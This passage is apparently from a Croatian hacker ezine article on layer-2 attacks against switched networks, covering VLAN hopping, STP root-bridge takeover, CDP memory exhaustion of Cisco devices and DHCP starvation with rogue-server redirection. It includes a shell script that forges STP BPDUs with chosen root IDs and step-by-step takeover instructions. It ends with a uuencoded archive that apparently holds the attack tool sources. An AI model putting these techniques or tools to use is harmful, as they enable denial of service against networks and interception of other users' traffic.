i ruta promet za veci broj vlan-ova koji koriste bilo 802.1q ili ISL encap. te
nakon sto se spoofamo preko ISL ili u ovom slucaju 802.1q tag-a sniff-amo vezu
 

--==<[  0x04e  STP rooting
      \_____________________________/     

    
     Jako zanimljiva stvar jest to da je STP u biti najcesce intergriran kao
out of the box na uredjaje te ga vecina admina olako rabi, a sve zbog njihova
neznanja i neshvacanja opasnosti koje njegovo koristenje predstavlja... nije
mali broj sigurnosnih propusta koji su u njemu prisutni pa stoga krenimo..

znaci osnovne BPDU poruke sadrzhe TCN/TCA (Notification/Acknowledgment) koje
obavjestavaju destination o promijeni topologije.. Vecina propusta koji su
uoceni na STP protokolu je DoS prirode kao sto su slanje velikog broja BPDU
poruka na mrezu, poruke o promjeni i error-u root bridge-a uzimaju oko 30 pa
do 45 sekundi sto naravno daje lijepe mogucnosti za DoS-anje.

Najbolje sto se moze izvuci iz svih nedostataka ovog protokola jest da se 
mi predstavimo i ubacimo kao root bridge! to postizemo slanjem bpdu poruka
na swicheve.. moramo MAC flood-ati dest switch ..... 

prije spominjani, izvrstan, alat yersinia podrzava slijedece STP napade:

* slanje RAW konfiguracijske BPDU
* slanje RAW TCN BPDU
* DoS RAW konfig BPDU
* DoS slanje RAW TCN BPDU
* preuzimanje uloge root switch-a
* preuzimanje drugih uloga
* dvostrano preuzimanje root uloge (MITM)

Znaci.. stp mrezno okruzenje lako nam moze omoguciti drop-anje odredjenog
segmenta ili pak cijele mreze utjecajem na neki od stp kompatibilnih uredjaja
sintaksa za build-anje bdpu-a sam naveo negdje gore a imate primjer programa:
*** stp.c ***

isto tako tu je i shell skripta za isti:

-----[code]-----

#!/bin/sh

device=eth0             # ethernet device name (default - eth0)
dmac=01:80:C2:00:00:00  # destination MAC (default - 01:80:C2:00:00:00)
smac=00:01:38:00:b4:c7  # source MAC (default - MAC on default device)
proto_id=0000           # Protocol Identifier (hex, 2 bytes)
proto_v_id=00           # Protocol Version Identifier (hex, 1 byte)
bpdutype=00             # BPDU type (hex, 1 byte)
flags=00                # flags value (hex, 1 byte)
rootid=800000013800b4c7 # Root Identifier (hex, 8 bytes)
rootpc=00000000         # Root Path Cost (hex, 4 bytes)
brid=800000013800b4c7   # Bridge Identifier (hex, 8 bytes)
portid=8002             # Port Identifier (hex, 2 bytes)
mage=0000               # Message Age (hex, 2 bytes)
maxage=1400             # Max Age (hex, 2 bytes)
hellotime=0200          # Hello Time (hex, 2 bytes)
fdelay=0f00             # Forward Delay (hex, 2 bytes)

./stp -v -dev $device -dmac $dmac -smac $smac -protoid $proto_id -protovid 
$proto_v_id -bpdu $bpdutype -flags $flags -rootid $rootid -rootpc $rootpc 
-brid $brid -portid $portid -mage $mage -maxage $maxage -htime $hellotime 
-fdelay $fdelay

-----[/code]-----

josh jednom da objasnim dakle princip napada.. znaci imamo spojene switcheve
koji koriste stp. mi moramo jednom switchu dati do znanja da podrzavamo i 
omogucavamo bolju putanju do nekog treceg mjesta od onog koje bi on koristio
dakle moramo se izboriti za to mjesto i tako prekinuti vezu izmedju ta dva
switcha sto nam naravno omogucava da se ubacimo u tu sesiju.
 
cekajte snifferom dok ne ulovite bpdu-e kojima root bridge identificira sebe
kao takvim ostalim switchevima. naravno kada vidimo BPDU identifikator mozemo
ga smanjiti i tako dobiti izbore za root switch. dakle nash_id=root_id - 1 !
konstantnim smanjivanjem id-a do minimuma i zatim slanjem ovog id-1 id-a 
ostajemo root-bridge a isto tako onemogucujemo forwarding state portova..
gore vidite maxage parametar koji je u ovom slucaju 1400 a on je zapravo
vrijeme do pocetka novih izbora root bridge-a nakon cega mi opet napravimo
istu stvar s id-evima.


--==<[  0x04f  CDP oom & DHCP flood
      \_____________________________/
        

     O CDP-u odnosno Cisco discovery protokolu sam kratko govorio u "Cisco
Routers Exposed" textu no evo par rijeci o njemu.. dakle to je protokol
koji radi na drugom OSI layeru a koristi se za ponalazenje drugih uredjaja
na mrezi od strane odredjenog cisco uredjaja.. omogucuje razmjenu info-a
dvama cisco routerima, switchevima medjusobno etc. radi preko SNAP 
(SubNetwork Access Protocol) protokola, a razmjenjuju se informacije o
IP adresi, verziji software-a, modelu uredjaja itd. CDP nije kriptiran te
ne zahtjeva nikakvu autentikaciju odnosno omogucuje svojevoljnu razmjenu
informacija izmedju uredjaja. preko CDP-a se moze doznati prilicno korisnih
informacija o VLAN-ovima, platformi te mogucnostima pojedinog cisco switcha.

No osim ovog info gatheringa iz same komunikacije CDP-om sam protokol ima
josh jedan veliki propust koji ako se iskoristi moze uzrokovati rusenje
cisco uredjaja zbog ostavljanja samog uredjaja bez usable memorije.. 
dakle zbog krive alokacije u memoriji za cdp proces (nema limita) moze
ga se natjerati u oom (out of memory) stanje. slijedi full source cdp.c,
cdp sender/flooder programa koji ce uraditi upravo to:
*** cdp2 ***

Odredjene stvari mogu se raditi i s yersiniom koju sam spominjao prije.
Isto tako uz ovaj propust cisco discovery-a postoji josh jedna stvar koja
se cesto potkrade na nekim switchevima, a to je ne-limitiranje MAC-ova na
odredjenim portovima sto omogucava tzv. DHCP starvation. iako se ova metoda 
otezava promenom autentikacije za DHCP message, nudi jako velike mogucnosti. 

definirani tip napada se zasniva na tome da se bradcast-aju DHCP zahtjevi
sa spoofanim MAC adresama. sama ideja je da se potrosi cijeli pool adresa
koje nudi dhcp server koji se nalazi toj mrezi pa ce slijedecim odnosno
buducim userima koje se zele spojiti na DHCP server pristup biti onemogucen.
ali naravno da mu takva vrst DoS-anja nije jedina namjena vec se naravno
moze uspjesno iskoristiti kao server napad jednostavim redirektom na nase
racunalo za presretanje traffic-a.. znaci jednostavno kada onemogucimo
izvorni dhcp server podignemo drugi dhcp cime mozemo odgovarati na dhcp
zahtjeve odredenih usera redirektom na nas preko DNS-a ili gateway-a. 
ovo se moze postici s dost PoC alata a jedan od boljih je Gobbler. gobbler
jest paket za ispitivanje DHCP-a na mrezama koji se sastoji od vishe 
komponenata i tijekom razvoja ima sve vishe mogucnosti, a trebao bi biti 
dostupan na --> www.networkpenetration.com. Ovo se sprjecava podesavanjem
port-security parametara tako da se ne moze odaslati vise spoofanih MAC-ova
na jedan port inace dolazi do njegovog shutdown-a ili suspend-a. 


///////////////////////////////////////////////////////////////////////////
--==<[ 0x05 Outro
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

Linkovi:

[yersinia download]:
 sourceforge.net/project/showfiles.php?group_id=117430&package_id=148523
[ettercap download]:
 http://ettercap.sourceforge.net/download.php

     Evo nas na kraju i ovog teksta.. Kazem, nadam se da je barem netko
od vas naucio nesto novo i da vrijeme provedeno citajuci ovo ne smatrate
uzalud potracenim. Sve greske i tehnicke korekcije molim da mi posaljete na 
h44rp.net[at]gmail.com. poz i do citanja u nekom od slijedecih brojeva.
  
gr337z 70: krobo, SiKe, Shatterhand, _bl00dz3r0_, nimr0d, set_X, DownBload,
           argv, m4rko, Exoduks, BoyScout.. rest #blackhat team, bh0x crew,
           ph eZine support stuff, posebno big kiss Jeleni :) , takodjer my 
           #linux crew, a isprika naravno ide 'nenamjerno' zaboravljenima ;>

5h17z 70:  svim priglupim sistemcima kojih je iz dana u dan sve vise..


-----                                                                -----
        "I've been reckless, but I'm not a rebel without a cause"
-----                                                                -----
\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\\

begin 644 sourcevi
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
;ZX3.U&J/S]L5GS_/G^?/_^KS+VL).\8`>```
`
end

